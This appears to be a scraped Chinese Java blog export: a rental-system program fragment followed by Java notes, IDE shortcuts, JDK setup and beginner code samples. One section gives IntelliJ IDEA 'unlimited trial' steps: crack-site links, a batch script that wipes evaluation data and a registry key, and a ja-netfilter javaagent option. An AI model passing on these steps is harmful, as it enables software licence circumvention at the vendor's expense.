mannedNum += cars[i].getMannedNum(); car += cars[i].getName() + \u0026#34;\\t\\t\u0026#34;; } if (cars[i].getGoodsNum() != 0) { goodsNum += cars[i].getGoodsNum(); truck += cars[i].getName() + \u0026#34;\\t\\t\u0026#34;; } } sum *= carDay; System.out.println(\u0026#34;———————————————————————————\\n你的账单:\u0026#34;); System.out.println(\u0026#34;***可载人的车有:\u0026#34;); System.out.println(car + \u0026#34;可载人数:\u0026#34; + mannedNum + \u0026#34;人\u0026#34;); System.out.println(\u0026#34;***可载货的车有:\u0026#34;); System.out.println(truck + \u0026#34;可载货物:\u0026#34; + goodsNum + \u0026#34;吨\u0026#34;); System.out.println(\u0026#34;***共租了\u0026#34; + carList.length + \u0026#34;辆车,租期为\u0026#34; + carDay + \u0026#34;天,总租车价格:\u0026#34; + sum + \u0026#34;元\\n———————————————————————————\u0026#34;); } } Initial.java import java.util.Scanner; class Initial { private static Scanner scan = new Scanner(System.in); public static void main(String[] args) { System.out.println(\u0026#34;你是否要租车:1是 0否\u0026#34; + \u0026#34;\\n请输入:\u0026#34;); int num = scan.nextInt(); for (; num != 1 \u0026amp;\u0026amp; num != 0; ) { System.out.println(\u0026#34;输入有误,请重新输入:\u0026#34;); num = scan.nextInt(); } if (num == 0) { System.out.println(\u0026#34;再见!\u0026#34;); } else { Car[] cars = Method.generateCars(); Method.displayList(cars); int carNum = Method.getCarNum(); int carDay = Method.getCarDay(); int[] carList = Method.getCarList(carNum, cars); Method.generateBill(cars, carList, carDay); System.out.println(\u0026#34;完成租车！\u0026#34;); } scan.close(); } } 实现效果 ","permalink":"https://xhstormr.github.io/blog/posts/java-rent/","summary":"","title":"通过 Java 实现租车系统"},{"content":"Updated on 2016-06-30\nhttps://www.tiobe.com/tiobe-index/\nhttps://package-search.jetbrains.com/\nhttps://javadoc.io/\nhttps://openjfx.io/javadoc/20/\nhttps://github.com/openjdk/jdk\nhttps://github.com/openjdk/jfx\nhttps://www.oracle.com/technetwork/java/index.html\nhttps://docs.oracle.com/en/java/javase/20/\nhttps://docs.oracle.com/javase/specs/index.html\nhttps://docs.oracle.com/javase/specs/jvms/se20/html/jvms-6.html\nhttps://docs.oracle.com/javase/8/docs/index.html\nhttps://docs.oracle.com/en/java/javase/20/docs/api/allclasses-index.html\nclass version\nIDE Eclipse：https://www.eclipse.org/downloads/eclipse-packages/ 汉化包：https://www.eclipse.org/babel/downloads.php IntelliJ IDEA：https://www.jetbrains.com/idea/download/ 将系统时间调整至 1 年以后再点击试用（Evaluation）。 Scene Builder：https://gluonhq.com/products/scene-builder/ IDEA 无限试用 https://zhile.io https://jetbra.in/s https://jetbrain.live/ https://jetbrain.tech/ @ echo off pushd . cd /d %USERPROFILE%/AppData/Roaming/JetBrains/IntelliJIdea2020.1 busybox rm -rf eval busybox sed -i \u0026#34;/evlsprt/d\u0026#34; options/other.xml reg delete HKEY_CURRENT_USER\\SOFTWARE\\JavaSoft\\Prefs\\jetbrains\\idea /f popd #Mac VM Options \u0026#34;/Users/user/Library/Application Support/JetBrains/IntelliJIdea2025.1/idea.vmoptions\u0026#34; ---- -javaagent:/Users/user/Documents/jetbra/ja-netfilter.jar=jetbrains IDEA 快捷键 Ctrl+Ctrl Run Anything Shift+Shift Search Everywhere F2 查找错误 F5 复制文件 F6 移动文件 Ctrl+[] 转至大括号处 Ctrl+Y 删除行 Ctrl+D 复制行 or 文件比较 Ctrl+G 转至行 Ctrl+B 转至声明处 Ctrl+R 替换文本 Ctrl+O 重写方法 Ctrl+I 实现方法 Ctrl+J 自动代码（Live Template） Alt+/ 文字补全 Alt+1 显示/隐藏工程面板 Alt+4 显示/隐藏运行面板 Alt+Enter 快速修正 Alt+下划线字母 选中/取消 Ctrl+Alt+T 代码包围 Ctrl+Alt+L 格式化代码 Ctrl+Alt+O 清除无效包引用 Ctrl+Shift+T 测试用例 Ctrl+Shift+J 合并行 Ctrl+Shift+U 大小写转换 Ctrl+Shift+Enter 完成声明 Shift+F6 重构 - 重命名（Rename） Ctrl+Alt+N 内联（Inline） Ctrl+Alt+V 提取为变量（Variable）（Extract） Ctrl+Alt+F 提取为属性（Field） Ctrl+Alt+P 提取为参数（Parameter） Ctrl+Alt+M 提取为方法（Method） Alt+Q 查看上下文 Ctrl+Q 查看快速文档 Ctrl+P 查看参数信息 Ctrl+Shift+I 查看快速定义 Ctrl+` 4 3 进入（退出）全屏 Ctrl+F5 Rerun Ctrl+F9 Build Project Ctrl+F10 Update Running JavaEE Application Shift+F10 Run Ctrl+Shift+F10 Run（Context） Ctrl+Shift+减 折叠所有代码块 Ctrl+Shift+加 展开所有代码块 Alt+J 多选关键字 Alt+Shift+J 退选关键字 Alt+Shift+Ctrl+J 全选关键字 Alt+Shift+Ctrl+点击 多选模式 Ctrl+Alt+S 设置 Ctrl+Shift+Alt+S 项目设置 Ctrl+Alt+U 显示 UML Ctrl+Shift+Alt+U 显示 UML（新窗口） F12 查看最近使用的工具窗口 Esc 返回编辑器 Shift+Esc 隐藏最近使用的工具窗口 Ctrl+F4 关闭文件 Alt+F4 关闭窗口 F3 搜索关键字 Alt+F3 高亮选中文本（same as Ctrl+F） F11 添加书签 Shift+F11 显示书签 滚轮 垂直滚动 Shift+滚轮 水平滚动 Ctrl+F12 查看文件结构 Ctrl+Alt+F12 查看文件路径 Ctrl+H 查看类型层级 Ctrl+Alt+H 查看调用层级 Alt+Insert 生成方法 Ctrl+Alt+Insert 新建文件 Ctrl+Shift+Insert 历史复制板 Ctrl+Shift+Alt+Insert 新建临时文件（Scratch） Ctrl+/ 注释行（单行注释） Ctrl+Shift+/ 添加注释（多行注释） Ctrl+Space 内容辅助（Class Name Completion 已被输入法占用，推荐设置为 Alt+。） Ctrl+Shift+Space 智能提示 Ctrl+E 最近访问文件 Ctrl+Shift+E 最近编辑文件 Ctrl+W 扩大选区 Ctrl+Shift+W 缩小选区 Ctrl+Z Undo Ctrl+Shift+Z Redo Ctrl+Shift+C 复制绝对路径 Ctrl+Shift+Alt+C 复制相对路径 Ctrl+N 查找类 Ctrl+Shift+N 查找文件 Ctrl+Shift+Alt+N 查找变量 Alt+↑↓ 切换方法 Alt+←→ 切换文件 Alt+Shift+←→ 切换编辑框 Alt+Ctrl+←→ 后向/向前 Shift+Alt+↑↓ 移动行 Shift+Ctrl+↑↓ 移动方法 Shift+Ctrl+Alt+←→ 移动方法参数 Shift+Enter 在当前行的下一行插入空行 Ctrl+Alt+Enter 在当前行的上一行插入空行 Eclipse 快捷键 F2 显示工具提示 F3 打开声明文件 F6 调试 - 单步跳过 Ctrl+D 删除行 Ctrl+L 转至行 Ctrl+Shift+F 格式化代码（最好改为 Ctrl+Alt+L） Ctrl+Shift+O 自动导入需要的包 Ctrl+. 快速查找 Ctrl+1 快速修正 Ctrl+2 快速帮助 L 分配为变量（Local） F 分配为属性（Field） M 提取为方法（Method） R 重构 - 重命名（Rename） Alt+Shift+↑↓ 扩大选区 Alt+Shift+I 内联（Inline） Alt+Shift+L 提取为变量（Variable）（Extract） Alt+Shift+M 提取为方法（Method） Alt+Shift+R 重构 - 重命名 Ctrl+/ 单行注释 Alt+Shift+J 文档注释 F11 调试运行 Ctrl+F11 运行 Ctrl+S 保存 Ctrl+Shift+S 全部保存 Ctrl+W 关闭 Ctrl+Shift+W 全部关闭 Alt+↑↓ 移动行 Ctrl+Alt+↑↓ 复制行 Alt+/ 内容辅助 Ctrl+Alt+/ 文字补全 Shift+Enter 在当前行的下一行插入空行 Ctrl+Shift+Enter 在当前行的上一行插入空行 Windows -\u0026gt; Preferences -\u0026gt; Java -\u0026gt; Editor -\u0026gt; Content Assist -\u0026gt; Auto Activation -\u0026gt; Trigger for Java 自动代码提示 JDK https://cdn.azul.com/zulu/bin/ https://bell-sw.com/pages/downloads/ https://adoptium.net/temurin/releases/ https://mirrors.tuna.tsinghua.edu.cn/Adoptium/ JDK：Java Development Kit（Java 开发工具包） JRE：Java Runtime Environment（Java 运行环境） JVM：Java Virtual Machine（Java 虚拟机） Edition 微型版(Micro Edition) 标准版(Standard Edition) 企业版(Enterprise Edition) 旧名 J2ME J2SE J2EE 新名 Java ME Java SE Java EE 类库 只包含SE中的一部分 核心类库 包含SE中的和企业扩展类 \u0026mdash;\u0026mdash;\u0026mdash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; 环境变量 变量值 变量名 JAVA_HOME C:\\Program Files\\Java\\jdk1.8.0_92 配置JDK安装路径 PATH %JAVA_HOME%\\bin 配置执行文件位置 CLASSPATH .;%JAVA_HOME%\\lib 配置类库文件位置 \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; setx JAVA_HOME \u0026#34;C:\\Program Files\\Java\\jdk1.8.0_92\u0026#34; /m setx PATH \u0026#34;%PATH%;%JAVA_HOME%\\bin\u0026#34; /m setx CLASSPATH \u0026#34;.;%JAVA_HOME%\\lib\u0026#34; /m 跨平台原理 a.java javac a.class java JVM HelloWorld! 源代码 编译器 字节码 解释器 虚拟机 \u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; \u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;》 CMD public class A { public static void main(String[] args) { System.out.println(\u0026#34;HelloWorld!\u0026#34;); } } D:\\\u0026gt;javac A.java D:\\\u0026gt;java A java命令不跟文件名，而是跟完全类名限定符 HelloWorld! ------------------------------------------------------- package abc; public class A { public static void main(String[] args) { System.out.println(\u0026#34;HelloWorld!\u0026#34;); } } D:\\\u0026gt;javac abc\\A.java D:\\\u0026gt;java abc.A HelloWorld! ------------------------------------------------------- fun main(args: Array\u0026lt;String\u0026gt;) { println(\u0026#34;HelloWorld!\u0026#34;) } D:\\kotlinc\\bin\u0026gt;kotlinc A.kt D:\\kotlinc\\bin\u0026gt;java -cp kotlin-stdlib.jar; AKt HelloWorld! or D:\\kotlinc\\bin\u0026gt;kotlinc -include-runtime -d 123.jar A.kt D:\\kotlinc\\bin\u0026gt;java -jar 123.jar HelloWorld! JRE and JAR 复制 JAVA_HOME 下的 jre 目录到 123 目录。 复制项目 JAR 文件至 123 目录。 在 123 目录新建 123.bat 文件。 123.bat ⇳ cmd /K jre\\bin\\java -jar 123.jar 合并多个 JAR 文件 将所有 JAR 文件解压至同一个目录。 在此目录下执行 jar -cfM 123.jar . Java 规范 源文件名：源文件名应该和其中的 public 类名相同。 程序入口：所有的 Java 程序由 public static void main(String[] args) 方法处开始执行。 变量：包含变量类型、变量名、变量值 3 个元素。String name=\u0026quot;Dave\u0026quot;; 常量：一种特殊的变量，由 final 修饰，值不能被改变。final char SEX = '男'; final 在修饰成员变量时，必须同时设定初值。 自动类型转换：表数范围小的可以向表数范围大的进行自动类型转换；将一个小容器的水倒入一个大容器没有问题，但是将一个大容器的水倒入一个小容器则会装不下，会溢出。byte→short(char)→int→long→float→double 强制类型转换：直接截断，不会进行四舍五入。int a = (int)3.1415926; 注释：单行注释（//），多行注释（/**/），文档注释（/***/）。 标识符：用于给 Java 程序中类、方法、变量等命名的符号，严格区分大小写。 只能由字母，数字， _ ， $ 组成，且不能以数字开头。 类名：首字母大写，大驼峰式命名法，MyFirstJavaClass。 方法名，变量名：首字母小写，小驼峰式命名法，stuName。 运算符：算术运算符、赋值运算符、比较运算符、逻辑运算符、条件运算符。 条件运算符：也称为三元运算符（?:）。String str1 = (8 \u0026gt; 5) ? \u0026quot;8大于5\u0026quot; : \u0026quot;8不大于5\u0026quot;; 语法形式：布尔表达式 ？ 表达式1 ：表达式2 运算过程：如果布尔表达式的值为 true ，则返回 表达式1 的值，否则返回 表达式2 的值。 条件语句 switch：当 switch 后表达式的值和 case 语句后的值相同时，从该位置开始向下执行，直到遇到 break 语句或者 switch 语句块结束；如果没有匹配的 case 语句则执行 default 块的代码。 switch 后面小括号中表达式的值必须是 整型或字符型 。 case 匹配后，如果没有遇见 break 会继续执行下一个的 case 块的内容，直到遇到 break 语句或者 switch 语句块结束。 default 块可以出现在 任意位置，也 可以省略。 循环语句 for：for 关键字后面括号中的三个表达式都可以省略，但两个 ; 不能省略。 for 循环变量初始化和循环变量变化部分，可以使用 , 同时初始化或改变多个循环变量的值。 数组（Array）：使用 数组名.length 获取数组的长度；使用 数组名[下标] 来访问；数组的下标从 0 开始，如长度为 3 ，则下标为 0，1，2。 二维数组：特殊的一维数组，它的每个数组空间中保存的是一个一维数组。 方法：用来解决一类问题的代码组合，是一个功能模块。通过 对象名.方法名() 调用方法。 访问修饰符：public、protected、private、缺省。 返回值类型：方法不返回任何值，则返回值类型指定为 void；方法具有返回值，则需要指定返回值的类型，并且在方法体中使用 return 语句返回值。 形参：定义方法时的参数，目的是用来定义方法需要传入的参数的个数和类型。 实参：调用方法时的参数，是传递给方法真正被处理的值。 重载： 方法名相同 ，但是形参的个数、顺序或类型不同，则称为方法的重载。 当调用被重载的方法时， Java 会根据参数的个数和类型来判断应该调用哪个重载方法，参数完全匹配的方法将被执行。 判断方法重载的依据：●必须是在同一个类中●方法名相同●方法参数的个数、顺序或类型不同。 构造方法：是用来初始化对象的方法，与类同名且没有返回值。 people a = new people(); 当没有指定构造方法时，系统会自动生成一个无参构造方法。所以 创建对象时,其实执行的是构造方法 。 有参构造方法的目的就是初始化对象中成员变量的值，并且可以通过条件语句判断值是否合理并赋予默认值。 static：可以修饰变量、方法、初始化块，被称为静态成员，它属于整个类所有，即 被类的所有对象共享 ；可以 直接使用类名访问 ，不需要创建对象。 静态成员属于整个类，当系统第一次使用该类时，就会为其分配内存空间直到该类被卸载才会进行资源回收。 静态变量：无需创建对象直接通过类名访问。 静态方法：无需创建对象直接通过类名访问。 静态初始化块：静态初始化块只在类加载时执行，所以只会执行一次，同时静态初始化块只能给静态变量赋值，不能初始化普通的成员变量。 初始化块：当创建类的实例时，会依次执行初始化块 {...}，可以通过初始化块进行数据赋值。 对象实例化执行顺序：静态初始化块 ➜ 初始化块 ➜ 构造方法。 封装：将类的某些信息隐藏在类内部，不允许外部程序直接访问，而是通过该类提供的方法来实现对隐藏信息的操作和访问。 优点：●只能通过规定的方法访问数据●隐藏类的实例细节，方便修改和实现。 步骤：设置属性为 private ➜ 创建 getter/setter 方法用于属性的读写 ➜ 在 getter/setter 方法中对属性值的合法性进行判断。 this：代表当前对象（调用者），在封装时常用于区分属性和参数。不能对静态成员使用 this，因为它跟对象没有关系。 this.属性：操作当前对象的属性。 this.方法：调用当前对象的方法。 内部类（Inner Class）：定义在 一个类里面的类 ；与之对应，包含内部类的类被称为外部类，并且内部类默认持有其外部类的强引用。 优点：●内部类提供了更好的封装，可以把内部类隐藏在外部类之内，不允许同一个包中的其他类访问该类●内部类的方法可以直接访问外部类的所有数据，包括私有的数据。 成员内部类：定义了成员内部类后，必须通过外部类对象来创建内部类对象，而不能直接去 new 一个内部类对象。内部类 对象名 = 外部类对象.new 内部类( ); 静态内部类：用 static 修饰的成员内部类，不需要外部类的对象，可以直接创建；相当于独立出来的类，不会持有其外部类的强引用。内部类 对象名= new 内部类(); 方法内部类：定义在方法中的类，只在该方法的内部可见，即只在该方法内可以使用。 继承（extends）：是类与类的一种关系，子类继承于父类（SuperClass），一个类只有一个父类，即单继承。class 子类 extends 父类 {...} 优点：子类拥有父类所有的属性和方法（不能为 private），实现代码复用。 重写：子类可以重写父类继承的方法，当调用方法时会优先调用子类的方法。 规则：返回值类型、方法名、参数类型及个数都要与父类继承的方法相同，才为方法的重写。（换句话说 只重写方法体） 继承初始化执行顺序：初始化父类（属性初始化 ➜ 构造方法） ➜ 初始化子类（相同） 子类的构造过程中必须调用其父类的构造方法。如果子类的构造方法中没有显式调用父类的构造方法，则系统默认隐式调用父类无参构造方法 super();；若显式调用构造方法，则必须放在子类的构造方法第一行。 super：代表父类对象。 super.属性：访问父类的属性。 super.方法：访问父类的方法。 Object类：是 所有类的父类；如果一个类没有明确使用 extends 关键字继承另外一个类，那么这个类默认继承于 Object类，且 Object类中的方法适用于所有子类。 toString() 方法：输出对象在内存中的地址字符串。可以通过重写该方法输出对象的属性值，Eclipse 的源码(Source)菜单中的 生成toString() 能自动完成。 equals() 方法：比较对象的引用是否指向同一块内存地址（比较是否为同一部手机）（== 运算符也可以做到）。可以通过重写该方法比较两个对象的属性值是否一致（比较两部手机的属性），Eclipse 的源码(Source)菜单中的 生成hashCode()和equals() 能自动完成。 getClass() 方法：返回类对象。example：Man b = new Man(); 类对象：关注类的代码信息(有哪些属性、方法)。Man.class 类的对象：关注对象的数据信息(属性值是多少)。new Man() 多态：对象的多种形态；继承 是多态的实现基础。 引用多态 父类的引用可以指向本类的对象。Animal a = new Animal(); 父类的引用可以指向 子类 的对象。Animal b = new Dog(); 方法多态 指向本类对象时，调用的方法为本类方法。 指向子类对象时，调用的方法为 子类重写或继承的方法。 即子类独有的方法不可访问，不能通过父类的引用调用子类独有的方法。 引用类型转换：使用 instanceof 运算符判断一个引用是否是某个类型或某个类型的子类型，从而判断是否可以使用强制类型转换，返回布尔值，通常与 if 配合使用。b instanceof Dog 向上类型转换（自动类型转换）：小类型到大类型的转换。Animal b = new Dog(); 向下类型转换（强制类型转换）：大类型到小类型的转换。Dog c = (Dog)b; 抽象类：用 abstract 修饰的类。public abstract class Phone {...} 作用： 通过抽象方法约束子类 必须包含某些方法，但不关注子类如何实现。 规则 用 abstract 修饰抽象方法，只有声明， 没有方法体。public abstract void call(); 包含抽象方法的类是抽象类。 抽象类可以包含普通方法，也可以没有抽象方法。 抽象类不能直接创建，通过 引用多态 指向子类对象来使用。Phone a = new SmartPhone(); 接口（interface）：使用 interface 定义接口，由全局常量和公共的抽象方法所组成。 类描述对象的属性和方法，接口则包含类要具有的属性和要实现的方法，它定义了某一批类所要遵守的 规范。 接口中的属性：常量，系统会自动添加 public static final 修饰符。 接口中的方法：抽象方法，系统会自动添加 public abstract 修饰符。 父类单继承（extends），接口多实现（ implements）。Java 中的类只能继承单个父类，不够灵活，可以 通过实现多个接口做补充。 继承是 is a（是什么） 的关系；接口是 has a（有什么） 的关系。 接口不能直接创建，通过 引用多态 指向实现接口的对象来使用。IPlayGame b = new SmartPhone(); 接口在使用过程中，经常与匿名内部类配合使用。 匿名内部类：没有名字的内部类，不关注类的名字，在使用的时候才定义。 项目分析 数据模型分析：通过对现实世界事物的主要特征进行抽象化处理，构建出数据结构。（类：方法、属性） 业务模型分析：在设计应用程序之前，应该明确业务开展过程中需要的功能。 显示和流程分析：显示界面的执行过程和流程的处理步骤。 面向对象编程（Object Oriented Programming）遵循 高内聚，低耦合 的设计原则。 高内聚：块内联系，每个模块尽可能的独立完成某个 特定的功能，单一责任原则。 低耦合：块间联系，模块之间的接口尽可能的 少而简单。 通常各模块的内聚程度越高，模块间的耦合程度就越低。 SVG Code int i = 5; int b = i++; //先进行赋值，再执行自增，b=5 ---- int i = 5; int b = ++i; //先执行自增，再进行赋值，b=6 String a = \u0026#34;你好\u0026#34;; //声明变量的同时进行初始化 ---- String a; //先声明后赋值 a = \u0026#34;你好\u0026#34;; Man b = new Man(); //声明对象的同时进行实例化 ---- Man b; //先声明后实例化 b = new Man(); int[] scores = new int[4]; //声明数组的同时进行分配空间，数组长度为 4 ---- int[] scores; //先声明后分配空间，再赋值放入数据，数组长度为 4 scores = new int[4]; scores[0] = 76; ---- int[] scores = { 76, 83, 92, 87 }; //声明数组的同时进行分配空间和赋值 ------------------------------------------------------- 流程控制语句 条件语句 if int score = 85; if (score \u0026gt; 80) { System.out.println(\u0026#34;奖励手机\u0026#34;); } 条件语句 if...else int score = 85; if (score \u0026gt; 80) { System.out.println(\u0026#34;奖励手机\u0026#34;); } else { System.out.println(\u0026#34;罚做俯卧撑\u0026#34;); } 条件语句 多重if int score = 85; if (score \u0026gt; 80) { System.out.println(\u0026#34;奖励手机\u0026#34;); } else if (score \u0026gt; 60) { System.out.println(\u0026#34;奖励鼠标\u0026#34;); } else { //前面的条件均不成立时，才会执行 else 块内的代码 System.out.println(\u0026#34;罚做俯卧撑\u0026#34;); } 条件语句 嵌套if String today = \u0026#34;周末\u0026#34;; String weather = \u0026#34;晴朗\u0026#34;; if (today.equals(\u0026#34;周末\u0026#34;)) { //String 类的 equals() 用于判断字符串内容是否相同 //内层if 开始 if (weather.equals(\u0026#34;晴朗\u0026#34;)) { System.out.println(\u0026#34;去散步\u0026#34;); } else { System.out.println(\u0026#34;待在家\u0026#34;); } //内层if 结束 } else { System.out.println(\u0026#34;去上班\u0026#34;); } 条件语句 switch int num = 1; switch (num) { case 1: System.out.println(\u0026#34;第一名\u0026#34;); break; case 2: System.out.println(\u0026#34;第二名\u0026#34;); break; case 3: System.out.println(\u0026#34;第三名\u0026#34;); break; case 4: //可以把功能相同的 case 语句合并起来 case 5: System.out.println(\u0026#34;鼓励奖\u0026#34;); break; default: System.out.println(\u0026#34;没有名次\u0026#34;); break; } 循环语句 while int i = 1; while (i \u0026lt;= 5) { //先判断，后执行 System.out.println(i); i++; } 循环语句 do...while int i = 1; do { //先执行，后判断，所以至少会无条件执行一次 System.out.println(i); i++; } while (i \u0026lt;= 5); 循环语句 for for (int i = 1; i \u0026lt;= 5; i++) { //结构更加简洁易读 System.out.println(i); } 循环跳转语句 break int sum = 0; for (int i = 1; i \u0026lt;= 10; i++) { sum = sum + i; if (sum \u0026gt; 20) { System.out.print(\u0026#34;当前的累加值为:\u0026#34; + sum); break; //循环将 1 到 10 之间的整数相加，如果满足累加值大于 20，则跳出循环 } } 循环跳转语句 continue int sum = 0; for (int i = 1; i \u0026lt;= 10; i++) { if (i % 2 == 1) { continue; //如果i为奇数,结束本次循环，进行下一次循环 } sum = sum + i; } System.out.print(\u0026#34;1到10之间的所有偶数的和为：\u0026#34; + sum); ---- i % 2 == 1 //i是奇数 i % 2 == 0 //i是偶数 循环语句 多重循环 打印九九乘法表 //外层循环每执行一次，内层循环要执行一圈 for (int i = 1; i \u0026lt;= 9; i++) { //外层循环控制打印行数 for (int x = 1, y = i; x \u0026lt;= y; x++) { //内层循环控制打印公式 System.out.print(x + \u0026#34;*\u0026#34; + y + \u0026#34;=\u0026#34; + x * y + \u0026#34; \u0026#34;); //print() 不会换行，println() 会换行 } System.out.println(); //打印完毕换行 } 获取用户输入数字并判断位数 ---- import java.util.Scanner; //导入 java.util 包下的 Scanner 类 public class HelloWorld { public static void main(String[] args) { Scanner a1 = new Scanner(System.in); //实例化 Scanner 对象为 a1 System.out.print(\u0026#34;请输入:\u0026#34;); //提示用户输入，使用 print() 不换行 int num = a1.nextInt(); //获取用户输入并保存在变量中 int count = 0; for (; num != 0; count++) { num /= 10; } System.out.println(count + \u0026#34;位\u0026#34;); a1.close(); //关闭输入 } } 获取用户输入班级成绩并计算平均分 ---- import java.util.*; //导入 java.util 包下的所有类 public class HelloWorld { public static void main(String[] args) { int classNum = 3; //班级数量 int stuNum = 4; //学生数量 double sum = 0; double avg = 0; Scanner a1 = new Scanner(System.in); //实例化 Scanner 对象为 a1 for (int i = 1; i \u0026lt;= classNum; i++) { sum = 0; //重置班级总分 System.out.println(\u0026#34;请输入第\u0026#34; + i + \u0026#34;个班级的成绩\u0026#34;); for (int j = 1; j \u0026lt;= stuNum; j++) { System.out.print(\u0026#34;请输入成绩:\u0026#34;); sum = sum + a1.nextInt(); //获取用户输入成绩并累加 } avg = sum / stuNum; System.out.println(\u0026#34;第\u0026#34; + i + \u0026#34;个班级的平均分是\u0026#34; + avg); } a1.close(); //关闭输入 } } ------------------------------------------------------- 循环遍历数组 ---- int[] nums = { 1, 2, 3 }; for (int i = 0; i \u0026lt; nums.length; i++) { //nums.length 获取数组长度 System.out.println(nums[i]); } ---- int[] nums = { 1, 2, 3 }; for (int a : nums) { System.out.println(a); //可以使用foreach形式来遍历数组和集合，for 语句的简化版，更简单便捷 } 循环遍历二维数组 ---- int[][] nums = { { 1, 2, 3 }, { 4, 5, 6 } }; for (int i = 0; i \u0026lt; nums.length; i++) { for (int j = 0; j \u0026lt; nums[i].length; j++) { System.out.println(nums[i][j]); } System.out.println(); } 使用 Arrays 类操作数组 ---- import java.util.Arrays; public class HelloWorld { public static void main(String[] args) { int[] scores = { 76, 83, 92, 87 }; Arrays.sort(scores); //将数组按升序排序 String a = Arrays.toString(scores); //将数组输出为字符串 System.out.println(a); } } 根据用户输入数字，随机生成排序后的数组，并打印数组输出的成字符串 ---- import java.util.Arrays; import java.util.Scanner; public class HelloWorld { public static void main(String[] args) { HelloWorld a = new HelloWorld(); //创建对象 Scanner b = new Scanner(System.in); //创建对象 System.out.print(\u0026#34;请输入：\u0026#34;); int num = b.nextInt(); //接收用户输入数字到变量 int[] arrays = a.arrays(num); //传递数字 System.out.println(Arrays.toString(arrays)); //将数组输出为字符串 b.close(); //关闭输入 } public int[] arrays(int a) { //方法 int[] arrays = new int[a]; //生成数组 for (int i = 0; i \u0026lt; arrays.length; i++) { arrays[i] = (int) (Math.random() * 100); //生成随机数并赋值给数组 } Arrays.sort(arrays); //排序数组 return arrays; //返回数组 } } 遍历数组输出前三名并判断成绩有效性 ---- import java.util.Arrays; public class HelloWorld { public static void main(String[] args) { int[] scores = { 89, -23, 64, 91, 119, 52, 73 }; HelloWorld a = new HelloWorld(); a.rank(scores); } public void rank(int[] a) { //方法 Arrays.sort(a); //排序数组 System.out.println(\u0026#34;前三名：\u0026#34;); for (int i = a.length - 1, count = 0; count \u0026lt; 3; i--) { //倒序遍历数组 if (a[i] \u0026gt; 100 || a[i] \u0026lt; 0) { //判断成绩有效性 continue; } System.out.println(a[i]); count++; } } } 遍历数组输出学生年龄的最大值 ---- public class HelloWorld2 { public static void main(String[] args) { HelloWorld2 a = new HelloWorld2(); //创建对象 int maxScore = a.getMaxAge(); //接收返回值 System.out.println(\u0026#34;最大年龄为：\u0026#34; + maxScore); } public int getMaxAge() { //方法 int[] a = { 19, 23, 21, 19, 25, 29, 17 }; int max = 0; for (int i : a) { //使用 foreach 形式来遍历数组 max = max \u0026gt; i ? max : i; //三元运算符 } return max; } } ------------------------------------------------------- 匿名内部类实现接口 ---- IPlayGame i = new IPlayGame() { public void playGame() { System.out.println(\u0026#34;匿名内部类实现接口的方式1\u0026#34;); } }; i.playGame(); ---- new IPlayGame() { public void playGame() { System.out.println(\u0026#34;匿名内部类实现接口的方式2\u0026#34;); //推荐方式2 } }.playGame(); ------------------------------------------------------- return 的用法 ---- public class A { public static void main(String[] args) { b(a()); } private static String a() { return \u0026#34;ABC\u0026#34;; 返回值 } private static void b(String s) { if (s == null) { 提前结束方法 return; } System.out.println(s); } } ------------------------------------------------------- Scanner.nextLine() 的用法 ---- Scanner scanner = new Scanner(System.in); while (true) { try { int i = scanner.nextInt(); System.out.println(i); break; } catch (Exception e) { scanner.nextLine(); 消耗之前的错误输出，避免死循环 System.out.println(\u0026#34;请重新输入!\u0026#34;); } } ---- public class A { public static void main(String[] args) { Scanner scanner = new Scanner(System.in); for (int i = 0; i \u0026lt; 5; i++) { System.out.print(\u0026#34;请输入：\u0026#34;); int num; while (true) { try { num = scanner.nextInt(); break; } catch (Exception e) { scanner.nextLine(); System.out.print(\u0026#34;请重新输入：\u0026#34;); } } switch (num) { case 1: System.out.println(\u0026#34;第一名\u0026#34;); break; case 2: System.out.println(\u0026#34;第二名\u0026#34;); break; case 3: System.out.println(\u0026#34;第三名\u0026#34;); break; default: System.out.println(\u0026#34;无名次\u0026#34;); break; } } } } ------------------------------------------------------- Math 类 ---- double i = 12.85; Math.ceil(i) 13.0 返回大于参数的最小整数（向上取整） 天花板 Math.floor(i) 12.0 返回小于参数的最大整数（向下取整） 地板 Math.round(i) 13 返回四舍五入后的整数 (int)i 12 强制类型转换，直接截断 Math.random() 0.6019044390548263 返回 [0,1) 之间的随机浮点数 ------------------------------------------------------- double d = 123456789.123456789; NumberFormat numberFormat = NumberFormat.getInstance(); numberFormat.setGroupingUsed(true); 设置数字分组 numberFormat.setMaximumIntegerDigits(4); 设置最大整数位 numberFormat.setMaximumFractionDigits(4); 设置最大小数位 numberFormat.setRoundingMode(RoundingMode.HALF_UP); 设置舍入模式 String s = numberFormat.format(d); 6,789.1235 ------------------------------------------------------- System.currentTimeMillis() Unix 时间戳，单位为毫秒（除以 1000 为标准 Unix 时间戳 (秒)） System.nanoTime() 精确计时器，单位为纳秒 long l1 = System.nanoTime(); Some code ... long l2 = System.nanoTime(); System.out.println(l2 - l1); String date = new SimpleDateFormat(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;).format(new java.util.Date(1475819315880L)); //2016-10-07 13:48:35 ------------------------------------------------------- System.getProperties().list(System.out); 获取系统属性 Map\u0026lt;String, String\u0026gt; getenv = System.getenv(); 